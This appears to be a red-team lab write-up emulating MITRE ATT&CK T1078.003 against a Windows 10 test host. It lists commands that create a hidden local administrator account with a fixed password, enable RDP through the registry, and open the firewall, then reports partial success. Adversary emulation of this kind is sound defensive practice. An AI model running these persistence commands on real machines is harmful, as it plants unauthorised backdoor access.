# T1078.003 - Valid Accounts: Local Accounts

## Description
This technique involves using valid local accounts to gain access, escalate privileges, or maintain persistence on a compromised system. Adversaries often create or leverage local accounts with administrative rights to blend in with normal activity.

**MITRE ATT&CK Technique:** [T1078.003 - Valid Accounts: Local Accounts](https://attack.mitre.org/techniques/T1078/003/)

---

## Simulation Parameters

- **Attacker:** Kali Linux (192.168.10.250)
- **Target:** Windows 10 Workstation (192.168.10.9) - Domain: ADPRO
- **Objective:** Create and utilize a dedicated local administrative account for access and persistence.

---

## Execution Steps

### 1. Account Creation (from privileged shell)

cmd
net user RedTeam P@ssw0rd123 /add
net localgroup administrators RedTeam /add


### 2. Enable Remote Access (RDP)

cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes


Results & ChallengesStatus:
Partially Successful
Successfully created a new local administrator account (RedTeam).
Successfully modified registry to enable RDP.
Failed to gain reliable remote access using the new account due to:Insufficient share permissions (ADMIN$ share not writable)
Possible UAC or token filtering issues
Authentication challenges with newly created accounts

Note: The original Administrator account worked more reliably for remote execution.


